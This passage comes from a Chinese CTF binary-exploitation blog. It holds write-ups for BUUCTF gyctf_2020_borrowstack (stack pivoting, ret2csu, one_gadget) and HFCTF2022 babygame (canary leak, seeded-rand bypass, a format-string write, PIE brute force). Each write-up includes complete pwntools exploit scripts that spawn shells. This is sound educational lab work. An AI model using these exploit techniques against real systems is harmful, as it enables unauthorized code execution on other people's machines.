<p>下图的左侧是使用send发送了0x20个数据，右侧使用的是sendline发送了0x20个数据，可以发现，<em>右侧最后发送是多了一个回车</em>，此时程序本来是正常要发送一句hello good ctfer!what is you name?然后会等待用户发送一个内容，然后显示what you want to，左侧的确是这样，但右侧直接what is you name?之后把what you want to给打印出来了，也就根本没有让用户输入内容，为什么？<strong>因为sendline多出来的回车，存放到了缓冲区里面，下次输入的时候，程序直接就把缓冲区里的内容读进去了，发现是个回车，程序认为你的输入已经结束了，因此就打印了what you want to，事实上你根本就还没输入。</strong></p>
<p>由此可见，在任何时候发送数据，选择sendline时，都需谨慎。<br><img src="../img/2706180-20220118123108958-93341427.jpg" alt="EkPq.jpg" border="0"></p>
<h2 id="BUUCTF上的gyctf-2020-borrowstack"><a href="#BUUCTF上的gyctf-2020-borrowstack" class="headerlink" title="BUUCTF上的gyctf_2020_borrowstack"></a>BUUCTF上的gyctf_2020_borrowstack</h2><p>这道题，不知道什么原因，用远程的exp是打不通本地的。因此这里我远程和本地的wp分别写了一份。二者的前面是一模一样的（但是后面的思路是不一样的），如果看过其中一份，那么另一份前面的内容跳过即可。<br>###打远程的WP</p>
<p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p>
<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
<p><img src="/../img/2706180-20220206163137949-2023688181.png"></p>
<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
<p><img src="/../img/2706180-20220206163202729-1115577905.png"></p>
<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和&#x2F;bin&#x2F;sh参数。</p>
<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</p>
<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
<p><img src="/../img/2706180-20220206163247051-126352913.png"></p>
<p><img src="/../img/2706180-20220206163309124-364277226.png"></p>
<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容（不仅仅是got表，还有FILE *stdout和FILE *stdin），导致程序崩溃。这里光说的话，比较抽象，我在这里详细讲一下。</p>
<p>因为这里的地址0x601060存放的是stdout指针，然后等到返回main函数之后又会执行setbuf(stdout, 0LL);可是因为这个0x601060距离我们迁移到的bss段这里太近了（我们迁移到的地址是0x601080），当执行put函数的时候执行了一次sub rsp 0x18,并且还执行了多次的push，此时的0x601060已经被覆盖成别的内容了具体情况参考下面的图【1】和图【2】<br><img src="/../img/2706180-20220206163334765-1162997865.png"></p>
<p><img src="/../img/2706180-20220206163343356-1256253278.png"></p>
<p>​												               图【1】</p>
<p><img src="/../img/2706180-20220206163355949-1171818220.png"></p>
<p>​																	图【2】</p>
<p>可以看见这两张图片，都因为调用了puts函数，从而影响了栈的变化，修改了stdout指针。等到返回main函数的时候，执行了setbuf(stdout, 0LL)，从而导致程序崩溃。</p>
<p>因此在这里我们的思路是利用ret指令，把构造的payload的存入稍微高点的地址空间，这样即使执行了puts函数开辟了栈帧，也依旧没有干扰到0x601060所存放的stdout指针。</p>
<p>继续说这个思路遇见的问题，因为要利用ret指令往下迁移来进行“栈”的布局，但是用多少个ret往下滑，这个只能去一次一次试。发现至少填充20个ret就可以把”栈”迁移到一个不会影响程序运行的地方。也就是说我们只要第二次先输入20个ret，然后正常的写一个pop_rdi的指令，然后是puts的got地址，接着就填写puts的plt地址，最后把返回地址填写成main函数。这样就泄露出来了libc_base，然后找到libc版本（打本地和远程找libc版本是方法是不一样的）我这里说下远程的libc版本怎么找，看网上师傅们说是泄露函数地址的后三位，然后上网站上搜索libc版本，可是我试了下不行（不知道是哪出了问题），然后有位师傅告诉我他是这么找的。</p>
<p><img src="/../img/2706180-20220206163407809-1014058819.png"></p>
<p>发现这是ubuntu16，然后去BUUCTF上找资源（因为我这个是在BUUCTF上做的），发现资源如下</p>
<p><img src="/../img/2706180-20220206163434246-1049956071.png"></p>
<p>然后点一下这个64bit的这个libc，下载即可。</p>
<p>最后用one_gadget来搜索这个libc的库，去找到获取shell的语句地址。</p>
<p><img src="/../img/2706180-20220206163445744-69836766.png"></p>
<p>这个constraints下面的就是这个execve执行的条件(至于哪个地址能满足这个条件，一个一个试试就行），然后上面就是对应的地址，最后我们要用这个地址去加上libc_base，得到真正的one_gadget地址。接着返回到main函数再来一遍，这回第一次输入的时候，我们直接把这个one_gadget给放入返回地址即可。最后要注意的就是因为返回到main函数之后，是有两个read的，尽管我们在第一个read就覆盖了返回地址，但是还是要把第二个read给发送一个内容，才可以结束main函数，因此我在最后一个read发送了一个’1’。</p>
<p>这个思路其实还有一种变形，就是在第一次read的时候，把rbp直接填充成我们要迁移之后的地址（这个地址是要保证执行puts函数也不会干扰到程序的正常数据），然后第二次输入只需要把迁移后的地址之前全部填充成垃圾数据，然后构造payload，等到迁移之后，直接迁移到了构造的payload的这里，效果和变形之前的思路是一样的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25199</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_ret_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_addr=<span class="number">0x4004c9</span></span><br><span class="line">main_addr=<span class="number">0x400626</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=p64(ret_addr)*<span class="number">20</span> <span class="comment">#这里ret最少是20个，也可以多一点</span></span><br><span class="line">payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shell))</span><br><span class="line">payload3=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>###打本地的wp</p>
<p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p>
<p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p>
<p><img src="/../img/2706180-20220206163137949-2023688181.png"></p>
<p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p>
<p><img src="/../img/2706180-20220206163202729-1115577905.png"></p>
<p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和&#x2F;bin&#x2F;sh参数。</p>
<p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。<strong>因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</strong></p>
<p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p>
<p><img src="/../img/2706180-20220206163247051-126352913.png"></p>
<p><img src="/../img/2706180-20220206163309124-364277226.png"></p>
<p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容，导致程序崩溃。</p>
<p>因此在这里我们不去返回到main函数，直接返回到read函数，这样就不会执行setbuf。</p>
<p>首先的第一个问题就是栈迁移之后，去执行puts函数，puts函数开辟的栈帧会去影响前面的got表中的内容，因此修改rbp时，我们把迁移的地址写的高一点，这样跳转执行的时候，就不会干扰低地址的数据。</p>
<p>由于这是64位程序，我们要想执行read，需要去找gadget进行传参。可是搜索之后才发现我们没有能控制rdx和rsi的指令，这也就是说我们如果想找gadget的话，执行read函数，连输入的地址都控制不了，因此这里采用ret2csu。</p>
<p><img src="/../img/2706180-20220206164556714-917859079.png"></p>
<p> （关于这个ret2csu的细节，在另一篇博客上说明，这里只介绍大致思路），然后执行了read函数之后，直接把read返回地址填写one_gadget地址即可获取shell。在执行read之前先执行puts去泄露puts的got地址，然后把puts的返回地址进行ret2csu去执行read函数。执行完puts的时候要记得给接收了，然后我们要去拿到libc基址，只需要用puts的真实地址去减libc库中的puts地址即可。用ldd去看下程序所依赖的动态库。</p>
<p><img src="/../img/2706180-20220206164604873-25607843.png"></p>
<p>获取了动态库的版本之后，就可以得到libc基址，然后再用one_gadget去搜索可以获取shell的one_gadget。</p>
<p> <img src="/../img/2706180-20220206164614769-1489437904.png"></p>
<p>至于哪个能用，一个一个试一下就行了。最后用one_gadget加上libc基址就是能够获取shell的地址，我们把这个指令的地址放到read的返回地址即可获取shell。至于怎么知道read的返回地址，这里有点讲究。</p>
<p>因为我们这里直接call read的got地址了，因此执行call的时候，会把下一条指令去当做返回地址，也就是0x4006ed<br><img src="/../img/2706180-20220206164714236-513385521.png"><br>（用ida也可以看出来） 又因为返回地址一定会被存到栈里面（这时候在执行read函数之前 用gdb看一下栈 看看哪个地址里面指向的是0x4006ed)</p>
<p> 然后就去将read函数输入内容的地址 设置成那个栈的地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h1 id="6、附录"><a href="#6、附录" class="headerlink" title="6、附录"></a>6、附录</h1><p>找leave;ret指令地址，只要在IDA里的代码段随便找到有leave ret出现的地方，取leave的地址即可</p>
<p> <img src="/../img/2706180-20220118122656393-1019618142.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/9107d8ac.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/9107d8ac.html" class="post-title-link" itemprop="url">虎符CTF2022 babygame</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>总结：</p>
<p>通过这道题的学习与收获有：</p>
<p>1、第一次尝试用爆破的方式来对抗PIE保护</p>
<p>2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本）</p>
<p>3、%s顺带打印出来canary并且泄露栈中数据（权当复习了）</p>
<p>4、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。</p>
<p>5、格式化字符串这道题考察了一个payload里面，同时写和同时读。</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220324174639847-1315554433.png"></p>
<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p><img src="/../img/2706180-20220324174650447-1634759747.png"></p>
<p>发现了溢出点（不过程序开了canary)，并且有个srand函数，猜测应该题目是个猜数游戏，同时我们还可以控制seed。</p>
<p><img src="/../img/2706180-20220324174704154-1694550770.png"></p>
<p>猜数的逻辑是随机生成一个数字（可能为0,1,2），如果是0，你就要输入1；如果是1，你就要输入2；如果是2，你就要输入0。否则的话就返回0，如果满足条件就继续循环，直至100次，如果全部满足条件就返回1。</p>
<p><img src="/../img/2706180-20220324174714420-1154506487.png"></p>
<p>如果返回的是1，就可以进入这个sub_13F7函数，发现这个函数虽然没有溢出，但是存在一个格式化字符串漏洞。</p>
<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>首先考虑一个点，程序给了溢出点，如果不用就太可惜了。用的话就要先泄露canary。可以发现read后面紧接着有一个%s将buf所打印出来，很明显这里可以把canary给带出来。</p>
<p>格式化字符串漏洞的威力很大，想利用的话，就要控制种子写个脚本跑一下即可进入存在格式化字符串漏洞的函数。</p>
<p>为了不将%s打印的内容截断，我们考虑把read输入的内容全写成\x11，直到把canary的00给覆盖了（防止00截断%s）。</p>
<p><img src="/../img/2706180-20220324174724027-646162084.png"></p>
<p>发现canary存放的是var_18。</p>
<p><img src="/../img/2706180-20220324174732236-219441364.png"></p>
<p>read输入的buf在这里<img src="/../img/2706180-20220324174740965-1855297000.png"></p>
<p>因此offset&#x3D;0x120-0x18+1&#x3D;0x109（加1的目的是为了把canary的00给覆盖了）</p>
<p>然后考虑下格式化字符串怎么用？如果只根据现在获取的信息的话，我也不知道怎么用，不过可以先把脚本写出来，调试一下，看看栈里面有没有可用的信息。</p>
<p>半成品脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    v2=libc.rand()%<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">        v3=<span class="number">0</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>可以看到现在已经进入到了存在格式化字符串漏洞的函数。</p>
<p><img src="/../img/2706180-20220324174752621-1282773898.png"></p>
<p><img src="/../img/2706180-20220324174801443-513220805.png"></p>
<p>有两个非常值得注意的点，也是这道题的突破口，就是栈里存了一个atoi偏移16的真实地址。我们有个格式化字符串漏洞，可以打印栈中数据（不过有个条件），倘若拿到了atoi的真实地址，我们就获得了libc基地址，然后就可以去搜一下one_gadget了。别忘了，格式化字符串是可以任意地址任意写的（尝试将返回地址写成one_gadget地址）。</p>
<h2 id="问题与对策"><a href="#问题与对策" class="headerlink" title="问题与对策"></a>问题与对策</h2><p>那现在有几个问题要考虑一下。</p>
<p>第一，格式化字符串打印栈中数据的前提是需要泄露栈地址，才可以打印指定的栈内容，怎么泄露栈地址？</p>
<p>第二，拿到libc基地址，再发送one_gadget，就势必需要劫持函数的控制流，可是我们第二次的read是没办法溢出的。</p>
<p>第三，怎么对抗PIE保护？</p>
<h3 id="解释问题一："><a href="#解释问题一：" class="headerlink" title="解释问题一："></a>解释问题一：</h3><p><img src="/../img/2706180-20220324174811564-1299319852.png"></p>
<p>我们再次观察栈中的数据发现，canary被%s打印完之后，打印并不会停止（因为没有遇见00），因此下面的栈中数据也被泄露出来了，碰巧这个数据是个栈地址。因此我们只需要接收完canary之后，再接收6字节，就可以泄露栈地址了。</p>
<h3 id="解释问题二："><a href="#解释问题二：" class="headerlink" title="解释问题二："></a>解释问题二：</h3><p>由于我们第一个read虽然可以溢出，但是我们只能去填充垃圾数据把canary和leak_stack_addr给带出来，因此没办法控制返回地址，第二个read没法溢出。那我们依旧<strong>考虑格式化字符漏洞，尝试用它去修改返回地址（我们完全可以这样做，因为我们已经拿到了泄露的栈地址）</strong>，修改返回地址为哪个地址？毋庸置疑，还得是第一个read的地址，因为我们要将one_gadget地址放到返回地址。当我试图将one_gadgeet地址写入返回地址时，突然意识到开启了PIE保护。</p>
<h3 id="解释问题三："><a href="#解释问题三：" class="headerlink" title="解释问题三："></a>解释问题三：</h3><p>先看下PIE保护所造成的问题吧。</p>
<p><img src="/../img/2706180-20220324174821291-294182259.png"></p>
<p><strong>我现在试图将lea rax,[rbp-0x120]这个指令地址写入返回地址</strong>，可是发现由于PIE保护的原因，每次程序运行的时候，这个地址只有后三位不变，前面的内容都会改变。这种情况就很是尴尬，<strong>因为格式化字符串写的时候要么一次写一字节（两位），要么一次写两字节（四位）</strong>（这里就不考虑一次写四字节的情况了）</p>
<p>因此我们根本没办法去正好控制后三位，那我们只控制后两位，让第三位去继承原本返回地址的内容？</p>
<p>返回地址</p>
<p><img src="/../img/2706180-20220324174830880-911959010.png"></p>
<p>要修改成的地址<br><img src="/../img/2706180-20220324174839396-1962481222.png"></p>
<p>可以发现，这俩并不凑巧相同。那控制后四位（即两字节）？</p>
<p><strong>控制后四位的话，我们确实可以定死后三位，但是倒数第四位由于PIE的原因，它是随机的</strong>，这条路行不通？</p>
<p>经过我尝试了许多别的方法，无论如何也都走不通，最后我又拐回来想这条路，突然意识到一件事，只有仅仅是倒数第四位随机而已，<strong>如果爆破呢？我们就随便蒙一个倒数第四位，正确的概率是1&#x2F;16</strong>(已经不低了)(意思就是说每次PIE，使基址倒数第四位是随机的（后三位地址是固定的），我们可以蒙一个数，然后去运行程序，只要有一次运行的程序基址倒数第四位是我们蒙的数字，就说明我们此时爆破成功），此时就可以顺利返回到one_gadget的地址了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">    libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">    payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">    canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        v2=libc.rand()%<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">            v3=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">            v3=<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">            v3=<span class="number">0</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;%42178c%9$hn&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%27$p&#x27;</span>+<span class="string">&#x27;aaa&#x27;</span>+p64(leak_addr-<span class="number">520</span>)</span><br><span class="line">    <span class="comment">#42178就是十六进制的a4c2,我赌倒数第四位是a   -&gt;.-&gt;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    atoi_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">16</span></span><br><span class="line">    libc_base=atoi_addr-lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr=lib.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">    bin_sh_addr=lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+libc_base</span><br><span class="line">    payload2=<span class="number">0x108</span>*<span class="string">&#x27;a&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4f302</span> +libc_base)</span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">times=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">10</span>+<span class="built_in">str</span>(times)+<span class="string">&quot; times&quot;</span>+<span class="string">&quot;*&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        